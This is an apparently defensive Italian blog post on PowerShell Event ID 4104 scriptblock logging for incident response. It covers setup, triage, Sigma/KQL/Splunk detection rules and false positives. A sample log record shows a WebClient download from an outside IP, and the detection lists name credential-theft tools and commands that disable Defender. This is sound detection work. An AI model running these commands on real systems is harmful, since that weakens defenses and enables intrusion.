---
title: "PowerShell Event ID 4104 spiegato: scriptblock logging per DFIR"
description: "Lo scriptblock logging è il controllo difensivo gratuito più utile di Windows. Registra il corpo completo dello script, inclusi quelli offuscati o in memoria, sotto l'evento 4104."
date: "2026-05-17"
---

Quando lo scriptblock logging di PowerShell è abilitato, l'engine registra il corpo di ogni script che si esegue. Comandi interattivi, script caricati da disco, qualsiasi cosa riflessa in memoria da `Invoke-Expression` o `IEX`. Il record atterra su `Microsoft-Windows-PowerShell%4Operational.evtx` come event ID **4104**, "Creating Scriptblock text".

Se non avete un EDR, è ciò che la piattaforma vi dà di più vicino a uno. Accendetelo. Il costo è trascurabile e il vantaggio è tutto ciò che PowerShell cerca di nascondere.

## Cosa ottenete

```xml
<Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">$wc = New-Object Net.WebClient; $wc.DownloadString('http://203.0.113.5/a')</Data>
<Data Name="ScriptBlockId">{guid}</Data>
<Data Name="Path">C:\Users\alice\Downloads\setup.ps1</Data>
```

Per uno script lungo, PowerShell divide il corpo su più record 4104, uno per `MessageNumber`. Rimetterli insieme è essenziale. I frammenti sono facili da fraintendere, e un attaccante che conosce lo scriptblock logging riempirà deliberatamente righe in modo che una corrispondenza parziale su un singolo record sembri benigna.

## Come accenderlo

`HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging = 1`. O la Group Policy a *Computer Configuration / Administrative Templates / Windows Components / Windows PowerShell / Turn on PowerShell Script Block Logging*. Non c'è costo lato PowerShell che valga la pena misurare. Accendetelo ovunque.

Mentre ci siete, abilitate anche Module Logging e trascrizione. Module Logging (4103) vi dà i valori dei parametri per invocazione. La trascrizione scrive la sessione console renderizzata in un file che potete spedire. Ciascuno cattura una fetta diversa. Nessuno sostituisce 4104.

## Cosa cattura 4104 che nient'altro fa

L'engine PowerShell logga lo script *dopo* qualsiasi encoding, compressione, o riflessione in memoria. Significa:

- Un'invocazione `-EncodedCommand` logga sia il launcher encodato (nel [4688](/en/blog/event-id-4688-process-creation) corrispondente o [Sysmon 1](/en/blog/sysmon-event-id-1-process-create)) sia il corpo decodato (in 4104).
- Uno script che scarica e fa `Invoke-Expression` di un payload remoto logga il corpo *eseguito*, non il wrapper.
- Un attaccante che usa bypass AMSI lascia comunque il record 4104. Il bypass influenza lo scanning, non il logging. Il bypass stesso si presenta spesso come righe 4104 contenenti `amsiInitFailed` o `amsiScanBuffer`.

Questo è il singolo controllo difensivo gratuito più utile sulla piattaforma. I difensori che non hanno EDR di solito hanno questo.

## Triage 4104 su scala

I pattern ad alto segnale in un corpus di record 4104:

- `DownloadString`, `DownloadFile`, `Invoke-WebRequest`, `Net.WebClient`. Fetch di contenuto remoto.
- `IEX`, `Invoke-Expression`. Esecuzione dinamica.
- `FromBase64String`, `[System.Convert]::FromBase64String`. Payload encodato.
- `Add-MpPreference -ExclusionPath`. Tampering di Defender.
- `Set-MpPreference -DisableRealtimeMonitoring`. Tampering di Defender.
- `[System.Reflection.Assembly]::Load`, `[Reflection.Emit]`. Caricamento di assembly in memoria.
- `Invoke-Mimikatz`, `Invoke-Kerberoast`, `Invoke-BloodHound`, `DCSync`. Tooling offensivo conosciuto.

Una singola corrispondenza da sola non è sempre maligna (gli admin usano `DownloadString` anche). Le combinazioni sì. Pivotate da 4104 al corrispondente [Sysmon event 1](/en/blog/sysmon-event-id-1-process-create) o [4688](/en/blog/event-id-4688-process-creation) per timestamp + processo per recuperare il contesto completo di invocazione.

## Sigma: tooling offensivo PowerShell

```yaml
title: Suspicious PowerShell Scriptblock - Offensive Tool Indicators
id: 4f1a3b8d-2c5e-4d8f-9a3b-1c2d3e4f5a6b
status: stable
description: PowerShell scriptblock body contains strings characteristic of offensive tooling, encoded payloads, or in-memory reflection.
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1027/
logsource:
  product: windows
  service: powershell
  category: ps_script
detection:
  selection_offensive:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Invoke-Mimikatz'
      - 'Invoke-Kerberoast'
      - 'Invoke-BloodHound'
      - 'Invoke-DCSync'
      - 'New-PSInjection'
      - 'Get-PassHashes'
  selection_reflective:
    EventID: 4104
    ScriptBlockText|contains:
      - 'System.Reflection.Assembly]::Load'
      - '[Reflection.Emit]'
      - 'FromBase64String'
  selection_defender_tamper:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Set-MpPreference -DisableRealtimeMonitoring'
      - 'Add-MpPreference -ExclusionPath'
      - 'Set-MpPreference -DisableIOAVProtection'
  condition: selection_offensive or selection_reflective or selection_defender_tamper
falsepositives:
  - Defenders running known offensive tooling for testing (whitelist by host)
  - Software installers using reflection for legitimate purposes
level: high
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense_evasion
```

## KQL: PowerShell encodato da un utente a bassi privilegi

```kusto
let encoded =
    Event
    | where Source == "Microsoft-Windows-PowerShell" and EventID == 4104
    | extend XmlData = parse_xml(EventData)
    | extend ScriptBlockText = tostring(XmlData.EventData.Data[2])
    | where ScriptBlockText contains "FromBase64String"
       or ScriptBlockText matches regex @"\b-e(?:nc|ncodedcommand)?\b\s"
    | project TimeGenerated, Computer, UserId=tostring(XmlData.System.Security["@UserID"]), ScriptBlockText;
encoded
| where UserId !startswith "S-1-5-18"   // exclude LocalSystem
   and UserId !startswith "S-1-5-19"
   and UserId !startswith "S-1-5-20"
| order by TimeGenerated desc
```

## Splunk: tampering di Defender da PowerShell

```spl
index=powershell EventCode=4104
   ( ScriptBlockText="*Set-MpPreference*DisableRealtimeMonitoring*"
     OR ScriptBlockText="*Add-MpPreference*ExclusionPath*"
     OR ScriptBlockText="*Set-MpPreference*DisableIOAVProtection*" )
| table _time host UserID ScriptBlockText
```

## Mapping ATT&CK

- T1059.001 Command and Scripting Interpreter: PowerShell. Ogni 4104 offensivo si mappa qui. PowerShell è una delle tecniche di esecuzione più citate nelle intrusioni moderne.
- T1027 Obfuscated Files or Information. Pattern Encoded, Base64, `FromBase64String`.
- T1140 Deobfuscate/Decode Files or Information. L'engine logga la forma *decodata*, che è il valore che 4104 fornisce rispetto a [4688](/en/blog/event-id-4688-process-creation).
- T1562.001 Impair Defenses: Disable or Modify Tools. `Set-MpPreference -DisableRealtimeMonitoring`, `Add-MpPreference -ExclusionPath`.
- T1003.001 LSASS Memory. Pattern `Invoke-Mimikatz`, `MiniDump`, `comsvcs.dll` nei corpi di script.
- T1558.003 Kerberoasting. Pattern `Invoke-Kerberoast`, Rubeus kerberoast.

## Falsi positivi che sembrano esattamente attacchi

- I runbook admin a volte usano `Invoke-Expression` legittimamente per configurazione template. La combinazione di solito è corta, ripetibile, e da sessioni admin conosciute.
- Gli script di gestione Defender (IT aziendale) chiamano `Set-MpPreference` legittimamente per pushare liste di esclusione. Whitelistate per certificato di firma dello script o SID host.
- Chocolatey, WinGet, installer di pacchetti usano PowerShell Base64-encodato legittimamente. Pattern: corto, di giorno, da host di build o admin.
- Attività red-team o pentest sembrerà identica ad attacchi reali. Coordinate finestre di engagement e taggate IP sorgente operatore.

## Il punto cieco

4104 logga il *corpo* dello script. Non logga esecuzione per statement, ritorni di funzione, o valori di variabile. Per quello vi serve 4103 (Module logging) o un EDR vero. 4104 vi dice cosa è girato. Il resto vi dice cosa ha fatto.

Se 4104 era spento quando è avvenuto l'attacco (il caso più comune che vedo negli incidenti su parchi datati), il corpo dello script è perso. L'invocazione wrapper potrebbe essere ancora in [4688](/en/blog/event-id-4688-process-creation), il timbro binario in [AmCache](https://www.amcacheparser.com), e la working directory in [prefetch](https://www.prefetchparser.com), ma il codice effettivo è perso a meno che non possiate carvarlo da [pagefile.sys](https://www.pagefilesysparser.com) o da un [dump RAM](https://www.ramparser.com). Accendetelo ora così non avrete quell'argomento con voi stessi la prossima volta.

## Per approfondire

- [Documentazione Microsoft: PowerShell script block logging](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)
- [FireEye/Mandiant: Greater Visibility Through PowerShell Logging](https://www.mandiant.com/resources/blog/greater-visibility)
- [Daniel Bohannon: Invoke-Obfuscation e detection](https://github.com/danielbohannon/Invoke-Obfuscation)
